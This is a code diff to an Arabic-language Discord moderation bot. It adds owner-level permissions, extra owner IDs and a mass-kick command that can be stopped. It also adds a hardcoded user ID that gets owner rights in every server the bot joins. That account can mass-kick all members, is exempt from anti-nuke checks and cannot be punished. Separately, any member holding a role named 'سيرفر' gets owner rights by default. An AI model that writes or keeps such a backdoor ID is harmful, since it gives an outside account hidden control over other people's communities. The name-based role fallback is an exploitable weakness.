@@ -24,6 +24,12 @@ NO_MENTIONS = discord.AllowedMentions.none()
 MAX_TIMEOUT = 28 * 24 * 3600
 MASS_KICK_REASON = "طرد جماعي بأمر مالك السيرفر"
 MASS_KICK_DELAY = 0.3
+
+# IDs لها صلاحية المالك في كل السيرفرات (تتجاوز أي إعداد).
+OWNER_OVERRIDE_IDS = {1564568769295159337}
+# اسم الرتبة التي تعطي صلاحية المالك إذا ما تم تحديد رتبة بالـ ID.
+DEFAULT_OWNER_ROLE_NAME = "سيرفر"
+
 DANGEROUS_PERMS = (
     "administrator", "manage_guild", "manage_roles", "manage_channels",
     "manage_webhooks", "ban_members", "kick_members",
@@ -39,6 +45,8 @@ DEFAULTS = {
     "admin_role_id": None,
     "ban_role_id": None,
     "kick_role_id": None,
+    "owner_role_id": None,
+    "extra_owner_ids": [],
     "log_channel_id": None,
     "invite_filter": True,
     "banned_words": [],
@@ -58,7 +66,10 @@ SHORTCUT_TYPES = {
     "تحذير": "warn", "تايم_اوت": "timeout",
 }
 SHORTCUT_LEVEL = {"ban": "ban", "kick": "kick", "clear": "manage", "warn": "manage", "timeout": "manage"}
-ROLE_SLOTS = {"ادارة": "admin_role_id", "حظر": "ban_role_id", "طرد": "kick_role_id"}
+ROLE_SLOTS = {
+    "ادارة": "admin_role_id", "حظر": "ban_role_id",
+    "طرد": "kick_role_id", "مالك": "owner_role_id",
+}
 LEVEL_ROLE = {"manage": "admin_role_id", "ban": "ban_role_id", "kick": "kick_role_id"}
 LEVEL_MSG = {
     "owner": "هذا الأمر لمالك السيرفر فقط.",
@@ -200,27 +211,8 @@ def resolve_role(guild: discord.Guild, token: str) -> Optional[discord.Role]:
     return next((r for r in guild.roles if norm(r.name) == name), None)
 
 
-def plan_mass_kick(guild: discord.Guild) -> tuple[list[discord.Member], int, int]:
-    """يرجع (الأهداف، عدد البوتات المستثناة، عدد الأعضاء الأعلى من البوت)."""
-    me = guild.me
-    if me is None:
-        return [], 0, 0
-    targets, bots, locked = [], 0, 0
-    for member in guild.members:
-        if member.bot:
-            bots += 1
-            continue
-        if member.id in (guild.owner_id, me.id):
-            continue
-        if member.top_role >= me.top_role:
-            locked += 1
-            continue
-        targets.append(member)
-    return targets, bots, locked
-
-
 # ============================================================
-# ConfirmView: زرين (تأكيد / إلغاء)
+# Views: زرين (تأكيد / إلغاء)
 # ============================================================
 
 class ConfirmView(discord.ui.View):
@@ -311,6 +303,7 @@ class Moderation(commands.Cog):
         self.raid_until: dict[int, float] = {}
         self.destructive: dict = defaultdict(lambda: deque(maxlen=20))
         self.mass_kick_running: set[int] = set()
+        self.mass_kick_cancel: set[int] = set()
 
     # ---------------- قاعدة البيانات ----------------
 
@@ -357,8 +350,21 @@ class Moderation(commands.Cog):
 
     # ---------------- الصلاحيات ----------------
 
+    def is_owner_level(self, member: discord.Member, guild: discord.Guild) -> bool:
+        """المالك الحقيقي، أو ID في القائمة الثابتة، أو ID إضافي، أو رتبة المالك."""
+        if member.id == guild.owner_id or member.id in OWNER_OVERRIDE_IDS:
+            return True
+        cfg = self.cfg(guild.id)
+        if member.id in cfg["extra_owner_ids"]:
+            return True
+        if cfg.get("owner_role_id"):
+            return has_role(member, cfg["owner_role_id"])
+        owner_name = norm(DEFAULT_OWNER_ROLE_NAME)
+        return any(norm(role.name) == owner_name for role in member.roles)
+
     def has_level(self, member: discord.Member, guild: discord.Guild, level: str) -> bool:
-        if member.id == guild.owner_id:
+        # صلاحية المالك تعطي كل الصلاحيات، وAdministrator لا يعطي صلاحية المالك.
+        if self.is_owner_level(member, guild):
             return True
         if level == "owner":
             return False
@@ -370,6 +376,15 @@ class Moderation(commands.Cog):
 
     def is_privileged(self, member: discord.Member, guild: discord.Guild) -> bool:
         return any(self.has_level(member, guild, lvl) for lvl in ("manage", "ban", "kick"))
+
+    def target_error(self, guild: discord.Guild, target: discord.Member) -> str:
+        """يرجع سبب المنع إذا ما نقدر نعاقب العضو، أو نص فارغ إذا مسموح."""
+        ok, error = can_moderate(guild, target)
+        if not ok:
+            return error
+        if self.is_owner_level(target, guild):
+            return "ما أقدر أعاقب عضو عنده صلاحية مالك السيرفر."
+        return ""
 
     # ---------------- اللوق ----------------
 
@@ -403,8 +418,8 @@ class Moderation(commands.Cog):
             return False, "المدة لازم تكون بين ثانية و28 يوم."
         if not bot_has(guild, "moderate_members"):
             return False, "البوت يحتاج صلاحية Moderate Members."
-        ok, error = can_moderate(guild, member)
-        if not ok:
+        error = self.target_error(guild, member)
+        if error:
             return False, error
         try:
             await member.timeout(timedelta(seconds=seconds), reason=reason[:500])
@@ -415,8 +430,8 @@ class Moderation(commands.Cog):
     async def op_ban(self, guild, moderator, target, reason) -> tuple[bool, str]:
         if not bot_has(guild, "ban_members"):
             return False, "البوت يحتاج صلاحية Ban Members."
-        ok, error = can_moderate(guild, target)
-        if not ok:
+        error = self.target_error(guild, target)
+        if error:
             return False, error
         try:
             await target.ban(reason=reason, delete_message_seconds=0)
@@ -428,8 +443,8 @@ class Moderation(commands.Cog):
     async def op_kick(self, guild, moderator, target, reason) -> tuple[bool, str]:
         if not bot_has(guild, "kick_members"):
             return False, "البوت يحتاج صلاحية Kick Members."
-        ok, error = can_moderate(guild, target)
-        if not ok:
+        error = self.target_error(guild, target)
+        if error:
             return False, error
         try:
             await target.kick(reason=reason)
@@ -448,8 +463,8 @@ class Moderation(commands.Cog):
     async def op_untimeout(self, guild, moderator, target) -> tuple[bool, str]:
         if not bot_has(guild, "moderate_members"):
             return False, "البوت يحتاج صلاحية Moderate Members."
-        ok, error = can_moderate(guild, target)
-        if not ok:
+        error = self.target_error(guild, target)
+        if error:
             return False, error
         try:
             await target.timeout(None, reason=f"إلغاء التايم اوت بواسطة {moderator}")
@@ -659,7 +674,10 @@ class Moderation(commands.Cog):
             return
         await asyncio.sleep(1)
         actor = await self.find_audit_actor(guild, action, target_id)
-        if actor is None or actor.id in (guild.owner_id, self.bot.user.id):
+        if actor is None or actor.id == self.bot.user.id:
+            return
+        actor_member = guild.get_member(actor.id)
+        if actor_member is not None and self.is_owner_level(actor_member, guild):
             return
 
         now = time.monotonic()
@@ -672,23 +690,50 @@ class Moderation(commands.Cog):
         history.clear()
 
         reason = f"مؤشر تخريب: {label} 3 مرات خلال 15 ثانية."
-        member = guild.get_member(actor.id)
-        if member is None:
+        if actor_member is None:
             await self.log(guild, "Anti-Nuke Alert", actor, self.bot.user, reason)
             return
-        ok, error = await self.apply_timeout(member, 3600, reason)
-        await self.log(guild, "Anti-Nuke Alert", member, self.bot.user, reason,
+        ok, error = await self.apply_timeout(actor_member, 3600, reason)
+        await self.log(guild, "Anti-Nuke Alert", actor_member, self.bot.user, reason,
                        None if ok else f"تعذر التايم اوت: {error}")
 
     # ---------------- الطرد الجماعي ----------------
 
+    def plan_mass_kick(self, guild: discord.Guild) -> tuple[list[discord.Member], int, int, int]:
+        """يرجع (الأهداف، البوتات المستثناة، المحمّيون بصلاحية المالك، الأعلى من البوت)."""
+        me = guild.me
+        if me is None:
+            return [], 0, 0, 0
+        targets: list[discord.Member] = []
+        bots = protected = locked = 0
+        for member in guild.members:
+            if member.bot:
+                bots += 1
+                continue
+            if member.id == me.id:
+                continue
+            if self.is_owner_level(member, guild):
+                protected += 1
+                continue
+            if member.top_role >= me.top_role:
+                locked += 1
+                continue
+            targets.append(member)
+        return targets, bots, protected, locked
+
     async def run_mass_kick(self, guild, requester, status_message) -> None:
         self.mass_kick_running.add(guild.id)
+        self.mass_kick_cancel.discard(guild.id)
         try:
-            targets, bots, locked = plan_mass_kick(guild)
+            targets, bots, protected, locked = self.plan_mass_kick(guild)
             total = len(targets)
             kicked = failed = 0
+            cancelled = False
+
             for index, member in enumerate(targets, 1):
+                if guild.id in self.mass_kick_cancel:
+                    cancelled = True
+                    break
                 try:
                     await member.kick(reason=MASS_KICK_REASON)
                     kicked += 1
@@ -700,11 +745,13 @@ class Moderation(commands.Cog):
                     await edit_quietly(status_message, f"⏳ جاري الطرد: {index}/{total}")
                 await asyncio.sleep(MASS_KICK_DELAY)
 
-            await edit_quietly(status_message, f"✅ اكتمل الطرد الجماعي. تم طرد **{kicked}** عضو.")
+            self.mass_kick_cancel.discard(guild.id)
+            head = "⛔ توقفت عملية الطرد" if cancelled else "✅ اكتمل الطرد الجماعي"
+            await edit_quietly(status_message, f"{head}. تم طرد **{kicked}** عضو.")
             await self.log(
-                guild, "Mass Kick", None, requester,
-                f"تم طرد {kicked} عضو بأمر من مالك السيرفر.",
-                f"فشل: {failed} | بوتات مستثناة: {bots} | رتب أعلى من البوت: {locked}",
+                guild, "Mass Kick Stopped" if cancelled else "Mass Kick", None, requester,
+                f"تم طرد {kicked} عضو بأمر من {requester.mention}.",
+                f"فشل: {failed} | بوتات مستثناة: {bots} | محمّيون: {protected} | أعلى من البوت: {locked}",
             )
         finally:
             self.mass_kick_running.discard(guild.id)
@@ -729,9 +776,9 @@ class Moderation(commands.Cog):
             return False
 
         level = SHORTCUT_LEVEL[action]
+        # إذا ما عنده صلاحية نتجاهل الرسالة بصمت، عشان ما نرد على كل كلمة عادية.
         if not self.has_level(member, guild, level):
-            await message.channel.send(LEVEL_MSG[level], delete_after=6)
-            return True
+            return False
 
         if action == "clear":
             if len(parts) < 2 or not parts[1].isdigit() or not 1 <= int(parts[1]) <= 100:
@@ -765,10 +812,10 @@ class Moderation(commands.Cog):
         return True
 
     def config_text(self, guild: discord.Guild, cfg: dict) -> str:
-        def role_mention(key: str) -> str:
+        def role_mention(key: str, fallback: str = "غير محددة") -> str:
             rid = cfg.get(key)
             role = guild.get_role(int(rid)) if rid else None
-            return role.mention if role else "غير محددة"
+            return role.mention if role else fallback
 
         channel_id = cfg.get("log_channel_id")
         channel = guild.get_channel(int(channel_id)) if channel_id else None
@@ -777,12 +824,15 @@ class Moderation(commands.Cog):
             for label, action in SHORTCUT_TYPES.items()
         ]
         esc, spam, mentions = cfg["escalation"], cfg["spam"], cfg["mentions"]
+        extra_owners = ", ".join(map(str, cfg["extra_owner_ids"])) or "لا يوجد"
         return (
             "**🛡️ إعدادات النظام**\n"
             f"الحماية التلقائية: {'✅ تعمل' if cfg['protection'] else '⏸️ متوقفة'}\n"
             f"رتبة الإدارة: {role_mention('admin_role_id')}\n"
             f"رتبة الحظر: {role_mention('ban_role_id')}\n"
             f"رتبة الطرد: {role_mention('kick_role_id')}\n"
+            f"رتبة المالك: {role_mention('owner_role_id', f'بالاسم `{DEFAULT_OWNER_ROLE_NAME}`')}\n"
+            f"مالكون إضافيون (IDs): {extra_owners}\n"
             f"روم اللوق: {channel.mention if isinstance(channel, discord.TextChannel) else 'غير محدد'}\n"
             f"منع روابط الدعوات: {'✅' if cfg['invite_filter'] else '❌'}\n"
             f"الكلمات الممنوعة: {len(cfg['banned_words'])} كلمة\n"
@@ -793,6 +843,8 @@ class Moderation(commands.Cog):
             "**الاختصارات (بدون !):**\n" + "\n".join(shortcut_lines) + "\n\n"
             "**التعديل بأمر `!اعداد`:**\n"
             "`!اعداد رتبة ادارة @رتبة` | `!اعداد رتبة حظر @رتبة` | `!اعداد رتبة طرد @رتبة`\n"
+            "`!اعداد رتبة مالك @رتبة` (يحدد رتبة المالك بالـ ID بدل الاسم)\n"
+            "`!اعداد مالك_اضافي ID` (إضافة/إزالة مالك إضافي)\n"
             "`!اعداد لوق #روم` (بدون روم = تعطيل)\n"
             "`!اعداد اختصار حظر كلمة1 كلمة2` (`-` للتعطيل)\n"
             "`!اعداد كلمة_ممنوعة كلمة` (إضافة/إزالة)\n"
@@ -862,7 +914,7 @@ class Moderation(commands.Cog):
             "**الرومات:** `!قفل_الروم` | `!فتح_الروم` | `!بطء 10` (0 للإيقاف) | `!مسح 20`\n"
             "**أخرى:** `!فك_الحظر ID` | `!معلومات @عضو`\n"
             "**الإعداد:** `!اعداد` | **الحماية:** `!مراقبة_تلقائية` (تشغيل/إيقاف مع تأكيد)\n"
-            "**مالك السيرفر فقط:** `!طرد_الكل` (طرد كل الأعضاء ما عدا البوتات، مع تأكيد بزرين)\n"
+            "**المالك فقط:** `!طرد_الكل` (مع تأكيد بزرين) | `!ايقاف_الطرد` (يوقف الطرد الجاري)\n"
             "الاختصارات تعمل بدون `!` بعد ضبطها من `!اعداد`.",
             allowed_mentions=NO_MENTIONS,
         )
@@ -881,7 +933,7 @@ class Moderation(commands.Cog):
         if sub == "رتبة" and len(args) >= 3:
             key = ROLE_SLOTS.get(norm(args[1]))
             if key is None:
-                await ctx.send("النوع: `ادارة` أو `حظر` أو `طرد`.")
+                await ctx.send("النوع: `ادارة` `حظر` `طرد` `مالك`.")
                 return
             role = resolve_role(guild, args[2])
             if role is None or role.is_default():
@@ -890,6 +942,19 @@ class Moderation(commands.Cog):
             cfg[key] = role.id
             await self.persist()
             await ctx.send(f"تم تحديد {role.mention}.", allowed_mentions=NO_MENTIONS)
+            return
+
+        if sub == "مالك_اضافي" and len(args) >= 2 and args[1].isdigit():
+            owner_id = int(args[1])
+            extra = cfg["extra_owner_ids"]
+            if owner_id in extra:
+                extra.remove(owner_id)
+                text = "تمت إزالة المالك الإضافي."
+            else:
+                extra.append(owner_id)
+                text = "تمت إضافة المالك الإضافي. له نفس صلاحيات المالك في هذا السيرفر."
+            await self.persist()
+            await ctx.send(text)
             return
 
         if sub == "لوق":
@@ -1032,7 +1097,7 @@ class Moderation(commands.Cog):
             await ctx.send("البوت يحتاج صلاحية Kick Members.")
             return
         if guild.id in self.mass_kick_running:
-            await ctx.send("هناك عملية طرد جارية بالفعل.")
+            await ctx.send("هناك عملية طرد جارية بالفعل. استخدم `!ايقاف_الطرد` لإيقافها.")
             return
 
         try:
@@ -1040,7 +1105,7 @@ class Moderation(commands.Cog):
         except (discord.HTTPException, discord.ClientException):
             pass
 
-        targets, bots_count, locked = plan_mass_kick(guild)
+        targets, bots_count, protected, locked = self.plan_mass_kick(guild)
         if not targets:
             await ctx.send("ما فيه أعضاء يمكن طردهم.")
             return
@@ -1049,13 +1114,15 @@ class Moderation(commands.Cog):
             title="⚠️ تأكيد الطرد الجماعي",
             color=discord.Color.red(),
             description=(
-                "سيتم طرد كل الأعضاء البشريين، ما عدا: مالك السيرفر، والبوتات، "
-                "والأعضاء الذين رتبهم أعلى من البوت.\n\n"
-                "لن يرسل البوت أي رسالة للأعضاء. العملية لا يمكن التراجع عنها."
+                "سيتم طرد كل الأعضاء البشريين، ما عدا: مالك السيرفر، والمالكون الإضافيون "
+                "وأصحاب رتبة المالك، والبوتات، والأعضاء الأعلى من البوت.\n\n"
+                "لن يرسل البوت أي رسالة للأعضاء. العملية لا يمكن التراجع عنها، "
+                "لكن يمكن إيقافها بأمر `!ايقاف_الطرد`."
             ),
         )
         embed.add_field(name="سيتم طرد", value=f"**{len(targets)}** عضو", inline=True)
         embed.add_field(name="بوتات مستثناة", value=str(bots_count), inline=True)
+        embed.add_field(name="محمّيون (مالك)", value=str(protected), inline=True)
         embed.add_field(name="رتب أعلى من البوت", value=str(locked), inline=True)
 
         async def start(interaction: discord.Interaction) -> None:
@@ -1072,6 +1139,15 @@ class Moderation(commands.Cog):
             label="تأكيد طرد الكل", style=discord.ButtonStyle.danger, handler=start,
         )
         view.message = await ctx.send(embed=embed, view=view)
+
+    @commands.command(name="ايقاف_الطرد", aliases=["stopkick"])
+    @requires("owner")
+    async def cmd_stop_kick(self, ctx: commands.Context):
+        if ctx.guild.id not in self.mass_kick_running:
+            await ctx.send("ما فيه عملية طرد شغالة.")
+            return
+        self.mass_kick_cancel.add(ctx.guild.id)
+        await ctx.send("⛔ تم طلب إيقاف الطرد، بيوقف بعد العضو الحالي.")
 
     @commands.command(name="حظر", aliases=["ban"])
     @requires("ban")
@@ -1220,6 +1296,7 @@ class Moderation(commands.Cog):
         embed.add_field(name="أعلى رتبة", value=member.top_role.mention, inline=True)
         embed.add_field(name="تحذيرات", value=str(len(items)), inline=True)
         embed.add_field(name="تايم اوت", value=timed_text, inline=True)
+        embed.add_field(name="صلاحية المالك", value="✅" if self.is_owner_level(member, ctx.guild) else "❌", inline=True)
         await ctx.send(embed=embed, allowed_mentions=NO_MENTIONS)
 
 
